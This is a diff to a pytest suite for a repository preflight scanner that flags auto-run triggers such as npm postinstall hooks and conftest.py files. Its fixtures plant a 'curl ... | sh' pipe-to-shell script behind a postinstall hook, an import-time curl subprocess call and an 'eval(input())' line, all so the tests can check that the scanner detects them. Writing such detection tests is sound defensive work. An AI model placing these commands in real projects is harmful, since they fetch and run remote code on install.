@@ -58,9 +58,10 @@ def test_preflight_inventories_the_documented_triggers(tmp_path):
         "claude_session_start", "mcp_server", "vscode_folder_open", "devcontainer_lifecycle", "npm_install",
     }
     assert len(report.surfaces) == 9
-    local = [row for row in report.surfaces if row.reference.status == "present_uninspected"]
+    local = [row for row in report.surfaces if row.reference.status == "present_inspected"]
     assert len(local) == 5
     assert all(row.reference.path == "scripts/setup.js" and row.reference.size_bytes == script.stat().st_size
+               and row.reference.observations == () and row.reference.content_sha256
                for row in local)
     remote = [row for row in report.surfaces if row.mechanism == "remote"]
     assert len(remote) == 1 and remote[0].reference.status == "remote_uninspected"
@@ -152,6 +153,59 @@ def test_preflight_reports_reached_limits(tmp_path, monkeypatch, limit, value, r
     report = preflight.inspect_repository(tmp_path)
     assert report.exit_code() == 2
     assert any(x["reason"] == reason for x in report.unobserved)
+
+
+def test_preflight_inspects_a_referenced_script_and_keeps_contents_out(tmp_path):
+    import hashlib
+
+    body = "curl -s https://example.invalid/x.sh | sh\n"
+    script = _write(tmp_path, "scripts/setup.sh", body)
+    _write(tmp_path, "package.json", {"scripts": {"postinstall": "bash ./scripts/setup.sh"}})
+    report = preflight.inspect_repository(tmp_path)
+    (surface,) = report.surfaces
+    ref = surface.reference
+    assert ref.status == "present_inspected"
+    assert ref.path == "scripts/setup.sh"
+    assert ref.content_sha256 == hashlib.sha256(script.read_bytes()).hexdigest()
+    assert "download_pipe_to_shell" in ref.observations
+    for output in (json.dumps(report.to_json()), "\n".join(report.lines())):
+        assert body not in output and "example.invalid/x.sh" not in output
+        assert ref.content_sha256[:12] in output
+
+
+def test_preflight_benign_referenced_script_has_no_observations(tmp_path):
+    _write(tmp_path, "scripts/setup.js", "console.log('synthetic benign setup')\n")
+    _write(tmp_path, "package.json", {"scripts": {"postinstall": "node ./scripts/setup.js"}})
+    report = preflight.inspect_repository(tmp_path)
+    (surface,) = report.surfaces
+    assert surface.reference.status == "present_inspected"
+    assert surface.reference.observations == ()
+    assert surface.reference.content_sha256
+
+
+def test_preflight_conftest_module_level_calls(tmp_path):
+    _write(tmp_path, "conftest.py",
+           "import subprocess\n"
+           "subprocess.run(['curl', 'https://example.invalid/x'], check=False)\n"
+           "\n"
+           "def test_nothing():\n"
+           "    assert True\n")
+    report = preflight.inspect_repository(tmp_path)
+    (surface,) = report.surfaces
+    assert surface.trigger == "pytest_conftest" and surface.mechanism == "import_time"
+    assert surface.reference.status == "present_inspected"
+    assert "module_level_subprocess_call" in surface.reference.observations
+    assert "module_level_network_call" not in surface.reference.observations
+
+
+def test_preflight_conftest_eval_at_module_level_and_benign_conftest(tmp_path):
+    _write(tmp_path, "conftest.py", "eval(input())\n")
+    _write(tmp_path, "tests/conftest.py", "import pytest\n\n\ndef test_x():\n    assert True\n")
+    report = preflight.inspect_repository(tmp_path)
+    by_manifest = {row.manifest: row for row in report.surfaces}
+    assert "module_level_eval_call" in by_manifest["conftest.py"].reference.observations
+    benign = by_manifest["tests/conftest.py"]
+    assert benign.reference.status == "present_inspected" and benign.reference.observations == ()
 
 
 def test_preflight_cli_emits_json_and_preserves_the_existing_scanner(tmp_path, capsys):
